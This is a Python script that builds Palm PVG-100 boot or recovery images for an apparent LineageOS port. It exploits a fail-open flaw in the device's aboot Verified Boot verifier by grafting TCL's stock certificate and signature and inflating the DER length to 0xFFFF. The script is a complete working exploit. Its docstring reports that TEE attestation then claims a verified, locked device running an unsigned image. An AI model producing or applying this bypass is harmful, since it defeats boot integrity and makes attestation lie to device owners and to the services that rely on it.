#!/usr/bin/env python3
"""
Build a Palm PVG-100 (pepito) boot/recovery partition image that boots GREEN.

No signing key is involved and none is needed: the stock TCL certificate and
RSA signature are grafted in verbatim (hardcoded below -- no donor file
required at runtime), and the outer SEQUENCE's declared length is inflated to
0xFFFF so aboot's verifier exits before parsing ANY of it. Monolithic,
idempotent, deterministic: rebuilding the same input is byte-identical.

(This is the batchH mechanism, ported into the sign-boot.py shape; destined to
replace scripts/boot-signing/scripts/sign-boot.py in the android tree.)


WHY THIS BOOTS GREEN (aboot fail-open, flash-validated 2026-07-22)
------------------------------------------------------------------
pepito's aboot implements Verified Boot 1.0. The boot state machine sets the
color/attestation register DAT_8f680d34 = 0 (GREEN) BEFORE calling
verify_image_with_sig, and no caller rewrites it afterward. One exit from
that function writes NOTHING: the "Signature length exceeds size signature
buffer" branch, taken when the sig block's outer SEQUENCE is well-formed DER
but declares a content length > 0x800. The check reads only the 4-byte header
-- cert, algorithm, auth_attrs and signature are never parsed, no RSA is
attempted, and boot continues with the pre-set GREEN. (Verify result never
gates boot on this device regardless; even RED boots.)

Confirmed on-device (AGENTS.md F7/F8):
  * G1: our image + AOSP verity cert + inflated length -> GREEN. TEE key
    attestation on that boot: verifiedBootState=0 (Verified/GREEN),
    deviceLocked=True, verifiedBootKey=029424f8...c3a6 -- the fail-open state
    propagates into QSEE, not just the splash screen.
  * H1: our image + grafted STOCK cert+sig + inflated length -> GREEN. Cert
    provenance is irrelevant on this path, exactly as the statics predicted
    (the exit fires on the header alone).


THE GRAFT (and why the invalid sig doesn't matter)
--------------------------------------------------
The AVBv1 signature covers image+auth_attrs, so the stock sig can never
verify over our image (F1) -- and it never has to: nothing on the fail-open
path evaluates it. STOCK_CERT_DER / STOCK_RSA_SIG below were extracted
2026-07-22 from boot.stock.bin (cert = 2nd element of the SEQUENCE appended
at img_size, sig = content of its 256-byte OCTET STRING; the extraction walk
is sign-boot-door2-batchH.py:extract_cert_and_sig). The cert is TCL's
self-signed "TCLMOBILE" cert, expires 2045-04-17.

The auth_attrs are HONEST for our image (target + true img_size). They are
never parsed on this path either; they stay honest so the block is fully
well-formed DER below the inflated header and offline tools parse it cleanly.
verify-boot-sig.py WILL report the signature as invalid over the image --
that is expected, not a regression.


ROOT OF TRUST / FBE CAUTION
---------------------------
aboot passes a boot-key digest to the keymaster TA (send_boot_key_to_keystore)
and it is mixed into FBE key derivation. On this fail-open path no key of
ours exists; whether the resulting verifiedBootKey is byte-identical to a
genuine stock boot was H1's open attestation question. Practical consequence:
dirty-flashing this over an install whose boot was signed by the PRE-2026-07-22
key-based version of the tree's sign-boot.py (or any other key) can change
the ROT and trigger the "decryption unsuccessful" factory-reset prompt.
Re-flashing the same image is always stable. Check attestation before
switching an install with data you care about.

The old key pair (vendor/lineage-priv/keys-boot/boot.{pk8,x509.pem}) is no
longer read by anything; delete it, or keep it to reproduce old yellow boots.


SIGNATURE STRUCTURE (AVBv1 BootSignature, as appended)
    SEQUENCE  -- declared content length forced to 0xFFFF (the exploit)
        INTEGER version = 1
        SEQUENCE certificate (STOCK_CERT_DER, verbatim)
        SEQUENCE AlgorithmIdentifier { OID sha1WithRSAEncryption, NULL }
        SEQUENCE auth_attrs { PrintableString target, INTEGER img_size }  (honest)
        OCTET STRING rsa_sig (STOCK_RSA_SIG, 256B; NOT valid over this image)

Header patches applied before assembly:
  - id field (0x240, 20 bytes): SHA1 over kernel+ramdisk+second (mkbootimg v0)
  - os_version (0x2C, 4 bytes): restored from stock to match bootloader expectation

USAGE -- run from the android tree root (uses defaults), or from anywhere
with explicit paths:
    /usr/bin/python3 sign-boot-graft.py
    /usr/bin/python3 sign-boot-graft.py \
        flash-staging/recovery_unsigned.img flash-staging/recovery.bin /recovery

Defaults:
    input:  <tree>/flash-staging/boot_unsigned.img
    output: <tree>/flash-staging/boot.bin
    target: /boot          (use /recovery when building recovery)
"""
import argparse
import hashlib
import struct
import sys
from pathlib import Path

from cryptography.hazmat.primitives import hashes
from cryptography.x509 import load_der_x509_certificate

PARTITION_SIZE = 0x4000000   # 64 MB boot partition
ID_OFFSET      = 0x240       # 20-byte mkbootimg SHA1 id
OSVER_OFFSET   = 0x2c        # 4-byte os_version
STOCK_OSVER    = bytes.fromhex('49010410')

# AlgorithmIdentifier: sha1WithRSAEncryption OID + NULL parameter
ALGO_ID = bytes.fromhex('300d06092a864886f70d0101050500')

# --- grafted material, verbatim from boot.stock.bin (see docstring) ---------
# TCL self-signed "TCLMOBILE" cert, 1013 bytes DER, expires 2045-04-17.
STOCK_CERT_DER = bytes.fromhex(
    '308203f1308202d9a003020102020900bab15735a08abfff300d06092a864886f70d01010505'
    '0030818f310b300906035504061302434e3112301006035504080c094755414e47444f4e4731'
    '11300f06035504070c085348454e5a48454e31123010060355040a0c0954434c4d4f42494c45'
    '31123010060355040b0c0954434c4d4f42494c453112301006035504030c0954434c4d4f4249'
    '4c45311d301b06092a864886f70d010901160e574d442d5244407463742e636f6d301e170d31'
    '37313133303039343234305a170d3435303431373039343234305a30818f310b300906035504'
    '061302434e3112301006035504080c094755414e47444f4e473111300f06035504070c085348'
    '454e5a48454e31123010060355040a0c0954434c4d4f42494c4531123010060355040b0c0954'
    '434c4d4f42494c453112301006035504030c0954434c4d4f42494c45311d301b06092a864886'
    'f70d010901160e574d442d5244407463742e636f6d30820120300d06092a864886f70d010101'
    '05000382010d00308201080282010100b480a2e8386fd1d3103bcbcf5e576dbf704a55096ada'
    '75e413a410a50d778e9773d65d63dbe677b2d89ab611f29ea7e5a6d1a2ec06c3d5585d1163eb'
    '05c73507fb5ac16f4211ff6fc5859936e2df73ef1aafbfb9fd545f795f5ca4a97b1abb4d025f'
    '0b9363be4c242ef3bbbe18b75365a84aeef66fbf96e0d085b6bce1fcb6242cb64050c7e64f28'
    '67b639e290f91bdb2a0ad06a79b5640fe4f7ecfb1922d890d892e42252ecd25a7f5523d5a037'
    'abf2bdfee21b9b4458fbab717196ff923c3f7a07b6819562f9537654d157a8d0705e19693643'
    'a700cd5224393fab80fe234a2ce4fe52a5c821810000a2f7d9a28d33af0d7ab6c05c76b6d37b'
    '8b316853b82f020103a350304e301d0603551d0e04160414856bce40fd4b5a5dc58cad210191'
    'ee53c6f7e056301f0603551d23041830168014856bce40fd4b5a5dc58cad210191ee53c6f7e0'
    '56300c0603551d13040530030101ff300d06092a864886f70d0101050500038201010093a116'
    'c56d8d7294e3e14a7e2afa389f602bb498fabc76ab9bcd747eab76c832fe47e1df3cfe564a48'
    '5ab3a67bab709d580cbca11dd0a81520b8db961bf4ee4388551600e64ddd19bc47d2e9feb2d3'
    'a059a2954efc464114656d69d4afdeaefacb8856f2dcf00795e76bec293aac0b729d85c9a588'
    '3a582e70ad9e9e7ae1527a262a7254f50c268906a0dcff010c256b10a733caba9fac6006fea6'
    '4f1f958e47e456b0bdd1e86d1a504902cdd36f0883912bfa5fc465ced3ce38f41684e5d9f9a4'
    '64b041a70b21b6a4b9b9861b1a5621a70428d57a7305925641fd90145b7524ac6c699902525e'
    '58fcc55780c1b4a48717487ddc8ba207610a4bb98d01dcef8a'
)
# Stock RSA-2048 signature (over the STOCK image + stock auth_attrs -- not ours).
STOCK_RSA_SIG = bytes.fromhex(
    '1a65ed0350dd6d8694a0384a916da4c0d41242fb074c4bfe86f45f77cf250aead81e2463bb57'
    '5c14be40f317b075eb3278a5268abac249ba37634f2d1203b3e9fad9437ee94d1b44b16d7425'
    '8e4a3226783d7459b9dd4868a6fa8adb6b0603f36eb8d65d509dddc78278d09e01105f118d87'
    'dcc77fe1e76bdcd9b48dc31b012f2b4aafd54d167d36c17469e5b8aeb591bb56de0f533d6fb1'
    'df9ea84aabd2e08792fa6234ade664321f089b33d9d464a4461277bba045dd9ccc75ed9fb211'
    '5bdf4b71ff4907750e8ec7b18792d5e4fe8253df0fc6ddbc434dc11e6ed6d4124b49fb556fe9'
    '3e202e13a7fc1e0a9bacc679dbc43e377eba4ea64794fd5219f59be1'
)
# Expected SHA-256 fingerprint of STOCK_CERT_DER; self_check enforces it so a
# botched edit of the constant above fails loudly instead of costing a flash.
STOCK_CERT_SHA256 = 'F3:6C:F9:E1:02:DD:54:04:FC:3D:A8:47:E6:7A:12:E9:3C:A3:98:8D:C7:C9:C5:A6:EA:44:ED:A6:4E:F9:96:EE'


def find_tree_root() -> Path:
    """Locate the android tree by walking up from CWD.

    Only called when src/dest defaults are needed. Deliberately NOT derived
    from __file__: in the android tree, scripts/boot-signing is a symlink into
    the PUBLIC landing repo (~/Projects/lineageos-pepito), so
    Path(__file__).resolve() escapes the tree and defaults would land in a
    public working copy.
    """
    for d in (Path.cwd(), *Path.cwd().parents):
        if (d / 'vendor/lineage-priv').is_dir():
            return d
    sys.exit('ERROR: no vendor/lineage-priv above CWD — run from inside the android tree, '
             'or pass src/dest explicitly.')


# ------------------------------------------------------------------ DER bits

def enc_len(n: int) -> bytes:
    if n < 0x80:
        return bytes([n])
    return bytes([0x82, n >> 8, n & 0xff])


def seq(b: bytes) -> bytes:
    return b'\x30' + enc_len(len(b)) + b


def build_auth_attrs(target: str, img_size: int) -> bytes:
    ps_bytes = target.encode('ascii')
    printable_str = b'\x13' + bytes([len(ps_bytes)]) + ps_bytes

    # Minimal positive INTEGER (sign-padded). Never parsed on the fail-open
    # path, but kept honest so the block is well-formed DER end to end.
    raw = img_size.to_bytes(4, 'big').lstrip(b'\x00') or b'\x00'
    if raw[0] & 0x80:
        raw = b'\x00' + raw
    integer = b'\x02' + bytes([len(raw)]) + raw

    return seq(printable_str + integer)


def der_tlv_len(buf: bytes, off: int) -> int:
    """Total encoded length (header + content) of the DER TLV starting at off."""
    n = buf[off + 1]
    if n < 0x80:
        return 2 + n
    n &= 0x7f
    return 2 + n + int.from_bytes(buf[off + 2:off + 2 + n], 'big')


def inflate_outer_len(sig_block: bytes) -> bytes:
    """Force the outer SEQUENCE to declare 0xFFFF content bytes.

    aboot's verifier rejects any declared length > 0x800 BEFORE parsing or
    RSA, via an exit path that leaves the pre-verify GREEN state untouched
    (see docstring). The inner content is untouched and still fully valid DER.
    """
    assert sig_block[0] == 0x30 and sig_block[1] == 0x82, 'expected long-form SEQUENCE'
    return b'\x30\x82\xff\xff' + sig_block[4:]


# --------------------------------------------------------------- image bits

def compute_id(img: bytes) -> bytes:
    """SHA1 over (kernel|ksize|ramdisk|rsize|second|ssize), matching mkbootimg v0."""
    ks = struct.unpack_from('<I', img,  8)[0]
    rs = struct.unpack_from('<I', img, 16)[0]
    ss = struct.unpack_from('<I', img, 24)[0]
    ps = struct.unpack_from('<I', img, 36)[0]

    def pages(n): return (n + ps - 1) // ps
    k_off = ps
    r_off = k_off + pages(ks) * ps
    s_off = r_off + pages(rs) * ps

    sha = hashlib.sha1()
    sha.update(img[k_off:k_off + ks]); sha.update(struct.pack('<I', ks))
    sha.update(img[r_off:r_off + rs]); sha.update(struct.pack('<I', rs))
    sha.update(img[s_off:s_off + ss]); sha.update(struct.pack('<I', ss))
    return sha.digest()


def compute_img_size(img: bytes) -> int:
    ks = struct.unpack_from('<I', img,  8)[0]
    rs = struct.unpack_from('<I', img, 16)[0]
    ps = struct.unpack_from('<I', img, 36)[0]
    def pages(n): return (n + ps - 1) // ps
    return (1 + pages(ks) + pages(rs)) * ps


def self_check(partition: bytes, img_size: int, target: str) -> str:
    """Structural re-check of the finished partition.

    The RSA sig CANNOT verify here (grafted stock sig over a different image),
    so unlike the old key-based script this checks structure, not crypto: the
    fail-open header is in place, the content below it re-assembles to exactly
    what we intended, and the embedded cert is the expected stock one. A
    malformed block is caught here instead of costing a flash cycle.
    """
    sig_block = partition[img_size:]
    assert sig_block[:4] == b'\x30\x82\xff\xff', \
        'fail-open header missing: outer SEQUENCE must declare 0xFFFF (> 0x800 bound)'

    expected = inflate_outer_len(seq(
        b'\x02\x01\x01' + STOCK_CERT_DER + ALGO_ID
        + build_auth_attrs(target, img_size)
        + b'\x04\x82\x01\x00' + STOCK_RSA_SIG))
    assert sig_block[:len(expected)] == expected, 'assembled sig block mismatch'
    assert not any(sig_block[len(expected):]), 'non-zero bytes in padding'

    # Cert must sit exactly where a parser would look (2nd element, after the
    # 3-byte version INTEGER) and be the stock TCL cert.
    c0 = 4 + 3
    cert = load_der_x509_certificate(sig_block[c0:c0 + der_tlv_len(sig_block, c0)])
    fp = cert.fingerprint(hashes.SHA256()).hex(':').upper()
    assert fp == STOCK_CERT_SHA256, f'embedded cert fingerprint mismatch: {fp}'
    return fp


# ---------------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser(
        description='Build a GREEN-booting pepito boot image: stock cert+sig graft '
                    'plus inflated outer length (fail-open). No key involved.')
    ap.add_argument('src',  nargs='?', type=Path, default=None)
    ap.add_argument('dest', nargs='?', type=Path, default=None)
    ap.add_argument('target', nargs='?', default='/boot')
    args = ap.parse_args()

    if args.src is None or args.dest is None:
        tree = find_tree_root()
        args.src  = args.src  or tree / 'flash-staging/boot_unsigned.img'
        args.dest = args.dest or tree / 'flash-staging/boot.bin'

    stock_cert = load_der_x509_certificate(STOCK_CERT_DER)  # for reporting

    img = bytearray(args.src.read_bytes())
    assert img[:8] == b'ANDROID!', 'not an Android boot image'

    img_id = compute_id(bytes(img))
    img[ID_OFFSET:ID_OFFSET + 20] = img_id
    img[OSVER_OFFSET:OSVER_OFFSET + 4] = STOCK_OSVER

    img_size   = compute_img_size(bytes(img))
    auth_attrs = build_auth_attrs(args.target, img_size)

    version   = b'\x02\x01\x01'
    sig_octet = b'\x04\x82\x01\x00' + STOCK_RSA_SIG
    sig_block = seq(version + STOCK_CERT_DER + ALGO_ID + auth_attrs + sig_octet)
    sig_block = inflate_outer_len(sig_block)

    sig_len    = len(sig_block)
    padding_sz = PARTITION_SIZE - img_size - sig_len
    assert padding_sz >= 0, f'image ({hex(img_size)}) + sig ({hex(sig_len)}) exceeds partition size'

    partition = bytes(img[:img_size]) + sig_block + b'\x00' * padding_sz
    assert len(partition) == PARTITION_SIZE

    fp = self_check(partition, img_size, args.target)

    args.dest.write_bytes(partition)
    print(f'graft       = stock TCL cert ({len(STOCK_CERT_DER)}B) + stock sig (256B), embedded verbatim')
    print(f'subject     = {stock_cert.subject.rfc4514_string()}')
    print(f'expires     = {stock_cert.not_valid_after:%Y-%m-%d}')
    print(f'id          = {img_id.hex()}')
    print(f'os_version  = {STOCK_OSVER.hex()}')
    print(f'img_size    = {hex(img_size)}')
    print(f'sig_len     = {hex(sig_len)} (declares 0xFFFF -> fail-open exit)')
    print(f'target      = {args.target}')
    print(f'self-check  = OK (structure; sig intentionally NOT valid over image)')
    print(f'fingerprint = {fp}')
    print(f'wrote {args.dest}')
    print()


if __name__ == '__main__':
    main()
